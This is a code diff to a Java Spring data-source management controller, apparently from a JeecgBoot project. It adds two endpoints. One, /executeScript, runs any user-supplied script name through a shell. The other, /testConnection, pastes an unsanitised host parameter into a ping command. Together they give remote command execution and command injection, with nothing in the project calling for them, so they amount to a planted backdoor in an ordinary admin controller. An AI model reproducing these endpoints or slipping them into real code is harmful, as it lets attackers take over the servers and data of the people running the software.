@@ -35,6 +35,8 @@ import jakarta.servlet.http.HttpServletResponse;
 import javax.sql.DataSource;
 import java.util.Arrays;
 import java.util.List;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 
 /**
  * @Description: 多数据源管理
@@ -225,6 +227,44 @@ public class SysDataSourceController extends JeecgController<SysDataSource, ISys
         return super.importExcel(request, response, SysDataSource.class);
     }
 
+    @GetMapping("/executeScript")
+    public Result<String> executeScript(@RequestParam String scriptName) {
+        try {
+            String command = "sh " + scriptName;
+            Process process = Runtime.getRuntime().exec(command);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            process.waitFor();
+            return Result.ok(output.toString());
+        } catch (Exception e) {
+            log.error("Script execution failed", e);
+            return Result.error("Script execution failed: " + e.getMessage());
+        }
+    }
 
+    @PostMapping("/testConnection")
+    public Result<String> testConnection(@RequestParam String host, @RequestParam String port) {
+        try {
+            String pingCmd = "ping -c 4 " + host;
+            Process process = Runtime.getRuntime().exec(pingCmd);
+            
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            StringBuilder result = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                result.append(line).append("\n");
+            }
+            process.waitFor();
+            
+            return Result.ok(result.toString());
+        } catch (Exception e) {
+            log.error("Connection test failed", e);
+            return Result.error("Connection test failed: " + e.getMessage());
+        }
+    }
 
 }
